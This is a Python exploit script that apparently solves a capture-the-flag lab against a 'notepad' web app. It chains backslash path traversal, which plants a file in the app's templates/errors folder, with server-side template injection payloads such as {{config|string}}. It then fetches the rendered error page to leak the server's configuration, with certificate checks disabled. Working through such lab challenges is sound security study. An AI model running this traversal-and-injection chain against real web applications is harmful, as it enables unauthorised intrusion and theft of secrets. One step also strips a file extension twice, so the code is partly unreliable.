import sys, requests, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
BASE = "https://notepad.mars.cylabacademy.net"
S = requests.Session()
S.headers.update({"User-Agent": "Mozilla/5.0"})
content = "\\..\\templates\\errors\\t{{7*7}}"
r = S.post(BASE + "/new", data={"content": content}, timeout=25, verify=False, allow_redirects=False)
print("Location brute:", r.headers.get("Location"))
print("statut:", r.status_code)
# et le probe qui marchait, on refait pareil
content2 = "\\..\\templates\\errors\\probe2{{config|string}}"
r2 = S.post(BASE + "/new", data={"content": content2}, timeout=25, verify=False, allow_redirects=False)
print("\nLocation probe2:", r2.headers.get("Location"))
m = re.search(r"/static/(.+)\.html$", r2.headers.get("Location", ""))
if m:
    name = m.group(1).split("/")[-1]
    rr = S.get(BASE + "/", params={"error": name[: -len(".html")]}, timeout=25, verify=False)
    print("rendu probe2 (extrait):", rr.text[:400].replace("\n", " "))
